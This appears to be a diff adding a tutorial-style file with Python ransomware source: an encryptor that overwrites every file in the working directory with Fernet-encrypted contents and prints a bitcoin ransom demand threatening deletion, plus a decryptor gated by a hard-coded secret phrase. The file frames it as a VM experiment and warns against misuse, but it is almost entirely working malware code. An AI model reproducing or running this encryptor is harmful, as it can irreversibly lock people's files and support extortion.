@@ -1,0 +1,72 @@
+######___This is for you to play on your Linux VM, and see how ransomware works. Create some files in the separate directory and try to run the encryptor 
+and then the decryptor. Do NOT use it in malicious purposes you WILL get caught and WILL get in trouble. I tested the code myself and everything works.___######
+
+###_That is the example of symmetric encryption_###
+
+#########___First of all - the Ransomware itself___#########
+
+_________________________________________________________________________________________________________________________________________________________
+
+import os
+from cryptography.fernet import Fernet
+
+files = []
+
+for file in os.listdir():
+        if file == "YourEncryptionFileName.py" or file == "thekey.key" or file == "YourDecryptionFileName.py":
+                continue
+        if os.path.isfile(file):
+                files.append(file)
+
+print(files)
+
+key = Fernet.generate_key()
+
+with open("thekey.key", "wb") as thekey:
+        thekey.write(key)
+
+for file in files:
+        with open(file, "rb") as thefile:
+                contents = thefile.read()
+        contents_encrypted = Fernet(key).encrypt(contents)
+        with open(file, "wb") as thefile:
+                thefile.write(contents_encrypted)
+
+print("All your files have been encrypted! Send 100$ to this bitcoin address, ... or your files will be deleted in 24 hours")
+
+______________________________________________________________________________________________________________________________________________________
+
+######______Now it is time for the decryption algorithm______######
+
+######___NOTE: Decryptor is with the secretphrase___######
+
+import os
+from cryptography.fernet import Fernet
+
+files = []
+
+for file in os.listdir():
+        if file == "YourEncryptionFileName.py" or file == "thekey.key" or file == "YourDecryptionFileName.py":
+                continue
+        if os.path.isfile(file):
+                files.append(file)
+
+print(files)
+
+with open("thekey.key", "rb") as key:
+        secretkey = key.read()
+
+secretphrase = "YourSecretPhrase"
+userphrase = input("Enter the secret phrase to decrypt your files:\n")
+if userphrase == secretphrase:
+
+        for file in files:
+                with open(file, "rb") as thefile:
+                        contents = thefile.read()
+                contents_decrypted = Fernet(secretkey).decrypt(contents)
+                with open(file, "wb") as thefile:
+                        thefile.write(contents_decrypted)
+                print("Congratulations, you saved your files!")
+else:
+
+        print("Sorry, your secretphrase is incorrect, try one more time:")
